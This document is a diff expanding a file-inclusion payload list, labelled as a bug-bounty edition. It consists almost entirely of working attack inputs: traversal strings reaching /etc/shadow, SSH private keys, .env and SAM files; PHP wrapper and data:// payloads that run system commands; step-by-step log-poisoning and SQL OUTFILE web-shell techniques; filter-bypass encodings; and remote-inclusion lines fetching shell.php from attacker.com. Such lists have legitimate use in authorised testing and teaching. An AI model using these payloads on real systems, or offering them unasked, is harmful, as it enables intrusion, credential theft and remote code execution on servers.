@@ -1,84 +1,333 @@
-# LFI/RFI Payloads
-# Categories: Basic Traversal, Wrappers, RFI, Log Poisoning, Windows
+# LFI/RFI Payloads — Advanced Bug Bounty Edition
+# Sources: PayloadsAllTheThings, HackTricks, PortSwigger, real bug bounty writeups (2025-2026)
+# Categories: Basic Traversal, PHP Wrappers, Log Poisoning, Platform-Specific, Encoding, RFI
 
-# === Basic Directory Traversal ===
+# ============================================================
+# SECTION 1: BASIC DIRECTORY TRAVERSAL
+# ============================================================
 ../../../etc/passwd
 ../../etc/passwd
 ../etc/passwd
-../../../../etc/passwd
-../../../../../etc/passwd
+../etc/passwd%00
 ../../../../../../etc/passwd
-..\\..\\..\\..\\..\\boot.ini
-..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+../../../../../../etc/shadow
+../../../../../../etc/hosts
+../../../../../../etc/issue
+../../../../../../etc/crontab
+../../../../../../etc/group
+../../../../../../etc/motd
+../../../../../../etc/aliases
 
-# === URL-Encoded Traversal ===
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-..%252f..%252f..%252fetc%252fpasswd
-..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
-%252e%252e%252fetc%252fpasswd
-
-# === Double Encoding ===
-..%252f..%252f..%252fetc%252fpasswd
-%252e%252e%252f%252e%252e%252fetc%252fpasswd
-
-# === Null Byte Injection (Older PHP) ===
-../../../etc/passwd%00
-../../../etc/passwd%00.txt
-../../../etc/passwd%2500
-
-# === PHP Wrappers ===
-php://filter/convert.base64-encode/resource=index.php
-php://filter/convert.base64-encode/resource=config
-php://filter/read=convert.base64-encode/resource=../../etc/passwd
-php://filter/convert.base64-encode/resource=../config.php
-php://filter/convert.base64-encode/resource=/etc/passwd
-php://input
-php://filter/convert.base64-encode/resource=../wp-config.php
-
-# === PHP Wrappers — RCE via Expect/Input ===
-php://input (POST: <?php system('id'); ?>)
-expect://id
-php://filter/convert.base64-encode/resource=../.git/config
-
-# === Log Poisoning → RCE ===
-# Inject PHP in User-Agent → include access.log:
-<?php system($_GET['cmd']);?>
-<?php echo shell_exec($_GET['cmd']);?>
-
-# Then access: ../../../var/log/apache2/access.log&cmd=id
-
-# === SSH Log Poisoning ===
-# Connect via SSH with PHP payload in username:
-<?php system($_GET['c']);?>
-
-# Then access: ../../../var/log/auth.log&c=id
-
-# === /proc/self/environ (User-Agent injection) ===
-../../../proc/self/environ
-../../../../proc/self/environ
-../../../../../proc/self/environ
-
-# === Various Platforms ===
-# Linux:
-../../../etc/passwd
-../../../etc/shadow
-../../../etc/hosts
-../../../etc/issue
-../../../proc/version
-../../../proc/self/cmdline
-../../../proc/self/environ
-
-# Windows:
+# --- Windows ---
 ..\\..\\..\\boot.ini
 ..\\..\\..\\windows\\win.ini
 ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\windows\\repair\\SAM
 
-# Java:
-WEB-INF/web.xml
-META-INF/MANIFEST.MF
+# ============================================================
+# SECTION 2: PHP WRAPPERS (File Read)
+# ============================================================
 
-# === RFI ===
+# --- php://filter Base64 Encode (to read source code) ---
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config
+php://filter/read=convert.base64-encode/resource=../../etc/passwd
+php://filter/convert.base64-encode/resource=../wp-config.php
+php://filter/convert.base64-encode/resource=../.git/config
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=admin/config.php
+php://filter/convert.base64-encode/resource=../includes/db.php
+
+# --- php://filter Rot13 (bypass some filters) ---
+php://filter/read=string.rot13/resource=index.php
+php://filter/write=convert.base64-encode/resource=shell.php
+
+# --- php://filter with multiple filters ---
+php://filter/convert.base64-encode|convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode|string.rot13/resource=index.php
+
+# --- php://input (POST PHP code to execute) ---
+php://input
+# POST body: <?php system('id'); ?>
+# POST body: <?php file_get_contents('/etc/passwd'); ?>
+# POST body: <?php echo shell_exec($_GET['cmd']); ?>
+
+# --- php://filter for iconv (convert encoding) ---
+php://filter/convert.iconv.utf-8.utf-7/resource=index.php
+php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php
+
+# ============================================================
+# SECTION 3: PHP WRAPPERS (RCE / File Write)
+# ============================================================
+
+# --- expect:// (if expect extension loaded) ---
+expect://id
+expect://cat /etc/passwd
+expect://ls -la
+
+# --- php://input for RCE ---
+# Requires allow_url_include=On
+# POST: <?php system('id'); ?>
+
+# --- data:// (PHP 5.2+, allow_url_include=On) ---
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+data://text/plain,<?php%20system('id');?>
+data://text/plain,<?php echo shell_exec($_GET['cmd']); ?>
+
+# --- phar:// (Phar deserialization) ---
+phar://shell.phar
+phar://./shell.phar/test.txt
+# Works even with some file extension checks when path ends in .phar
+# Needs phar file uploaded somewhere first
+
+# --- zip:// (Zip file read) ---
+zip:///path/to/shell.zip#shell.php
+zip://./uploads/file.zip#shell.php
+# Requires a zip file to be uploaded first
+
+# ============================================================
+# SECTION 4: LOG POISONING → RCE
+# ============================================================
+
+# --- Apache Access Log Poisoning ---
+# Step 1: Inject PHP payload in User-Agent:
+#   curl http://target/page -H "User-Agent: <?php system($_GET['c']); ?>"
+# Step 2: Include the log file:
+#   page?template=../../../var/log/apache2/access.log&c=id
+
+# Log paths:
+../../../var/log/apache2/access.log
+../../../var/log/apache2/error.log
+../../../var/log/httpd/access_log
+../../../var/log/httpd/error_log
+../../../var/log/apache/access.log
+../../../var/log/apache/error.log
+../../../apache/logs/access.log
+../../../apache/logs/error.log
+
+# --- Nginx Access Log Poisoning ---
+../../../var/log/nginx/access.log
+../../../var/log/nginx/error.log
+../../../usr/local/nginx/logs/access.log
+../../../usr/local/nginx/logs/error.log
+
+# --- SSH Log Poisoning ---
+# Step 1: Attempt SSH with PHP payload as username:
+#   ssh '<?php system($_GET["c"]);?>'@target.com
+# Step 2: Include auth.log:
+#   page?template=../../../var/log/auth.log&c=id
+
+../../../var/log/auth.log
+../../../var/log/secure
+
+# --- Mail Log Poisoning ---
+# Step 1: Send email with PHP payload
+# Step 2: Include mail.log:
+../../../var/log/mail.log
+../../../var/log/mail
+
+# --- MySQL Log Poisoning ---
+# If FILE privilege: write PHP shell to web root
+#   ' UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php' --
+
+# ============================================================
+# SECTION 5: /proc/self/* EXPLOITATION
+# ============================================================
+
+# --- /proc/self/environ (User-Agent injection) ---
+# Inject payload in User-Agent header, then include:
+../../../proc/self/environ
+../../../../proc/self/environ
+../../../../../proc/self/environ
+../../../../../../proc/self/environ
+
+# --- /proc/self/fd/* (file descriptor brute force) ---
+../../../proc/self/fd/0
+../../../proc/self/fd/1
+../../../proc/self/fd/2
+../../../proc/self/fd/3
+... (bruteforce 0-50 to find temporary files)
+
+# --- /proc/self/cmdline ---
+../../../proc/self/cmdline
+
+# --- /proc/self/status ---
+../../../proc/self/status
+
+# --- /proc/self/maps ---
+../../../proc/self/maps
+
+# --- /proc/self/cwd (current working directory) ---
+../../../proc/self/cwd/index.php
+../../../proc/self/cwd/../../../etc/passwd
+
+# --- /proc/*/cmdline (other processes) ---
+../../../proc/1/cmdline
+../../../proc/2/cmdline
+
+# ============================================================
+# SECTION 6: ENCODING / BYPASS TECHNIQUES
+# ============================================================
+
+# --- URL Encoding ---
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
+..%2f..%2f..%2fetc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+
+# --- Double URL Encoding ---
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%255c..%255c..%255cetc%255cpasswd
+
+# --- Triple URL Encoding ---
+%25252e%25252e%25252fetc%25252fpasswd
+
+# --- UTF-8 / Unicode Overlong Encoding ---
+..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd
+
+# --- UTF-16 Encoding ---
+..%uff0e%uff0e%uff0fetc%uff0fpasswd
+
+# --- Null Byte Injection (PHP < 5.3.4) ---
+../../../etc/passwd%00
+../../../etc/passwd%00.html
+../../../etc/passwd%00.txt
+../../../etc/passwd%2500
+../../../etc/passwd%00.php
+
+# --- Path Truncation (PHP < 5.3) ---
+../../../etc/passwd/././././././././././.
+../../../etc/passwd/...................................................................
+
+# --- Absolute Path (if filter blocks ../) ---
+/etc/passwd
+/etc/shadow
+/var/www/html/index.php
+
+# --- Current Directory Traversal ---
+./../../../etc/passwd
+./../../../../../etc/passwd
+
+# --- ..;/ (IIS/ASP.NET specific) ---
+..;/..;/..;/etc/passwd
+..\;..\;..\;windows\win.ini
+
+# ============================================================
+# SECTION 7: PLATFORM-SPECIFIC PATHS
+# ============================================================
+
+# --- Linux Files ---
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/issue
+/etc/crontab
+/etc/fstab
+/etc/mtab
+/etc/group
+/etc/aliases
+/etc/hostname
+/etc/resolv.conf
+/etc/ssh/sshd_config
+/etc/ssh/ssh_config
+/etc/mysql/my.cnf
+/etc/php.ini
+/etc/httpd/conf/httpd.conf
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/proc/version
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/net/tcp
+/proc/net/route
+/root/.bash_history
+/root/.ssh/id_rsa
+/root/.ssh/id_rsa.pub
+/root/.ssh/authorized_keys
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+
+# --- Linux — PHP/Laravel/WP Specific ---
+/var/www/html/wp-config.php
+/var/www/html/.env
+/var/www/html/config/database.php
+/var/www/html/app/config/database.php
+/var/www/html/includes/config.php
+/var/www/html/config.php
+/var/www/html/.git/config
+/var/www/html/composer.json
+/var/www/html/vendor/autoload.php
+
+# --- Windows Files ---
+c:/boot.ini
+c:/windows/win.ini
+c:/windows/system32/drivers/etc/hosts
+c:/windows/system32/config/SAM
+c:/windows/repair/SAM
+c:/windows/php.ini
+c:/windows/my.ini
+c:/inetpub/wwwroot/web.config
+c:/inetpub/wwwroot/global.asa
+c:/Program Files/Apache Group/Apache/conf/httpd.conf
+c:/xampp/apache/conf/httpd.conf
+c:/xampp/php/php.ini
+c:/Users/Administrator/NTUser.dat
+
+# --- Java / Tomcat ---
+/WEB-INF/web.xml
+/WEB-INF/applicationContext.xml
+/WEB-INF/dwr.xml
+/WEB-INF/struts-config.xml
+/WEB-INF/faces-config.xml
+/META-INF/MANIFEST.MF
+/META-INF/context.xml
+
+# ============================================================
+# SECTION 8: RFI (Remote File Inclusion)
+# ============================================================
+
+# --- Basic RFI (allow_url_include=On required) ---
 http://attacker.com/shell.txt
-https://attacker.com/shell.txt
 http://attacker.com/shell.php
-data:text/plain,<?php system('id');?>
+https://attacker.com/evil.txt
+
+# --- RFI via Null Byte (PHP < 5.3.4) ---
+http://attacker.com/shell.php%00
+http://attacker.com/shell.php%00.html
+
+# --- RFI via Data URI ---
+data://text/plain,<?php%20system('id');?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+data://text/plain,<?php echo shell_exec($_GET['cmd']); ?>
+
+# --- RFI via SMB Share (Windows) ---
+\\attacker.com\share\shell.php
+
+# --- RFI via FTP ---
+ftp://attacker.com/shell.txt
+ftp://user:pass@attacker.com/shell.php
+
+# ============================================================
+# SECTION 9: PERL / JSP / ASP WRAPPERS
+# ============================================================
+
+# --- Perl wrappers ---
+# (if Perl CGI):
+-cgi?/etc/passwd
+# -C  (stat info)
+# -X  (executable)
+# -R  (readable)
+
+# --- JSP / Server-side includes ---
+<!--#include file="WEB-INF/web.xml"-->
+<!--#include virtual="/WEB-INF/web.xml"-->
+
+# --- ASP.NET wrappers ---
+?file=../../../windows/win.ini
+?file=web.config
+?file=..\..\..\..\windows\system32\drivers\etc\hosts
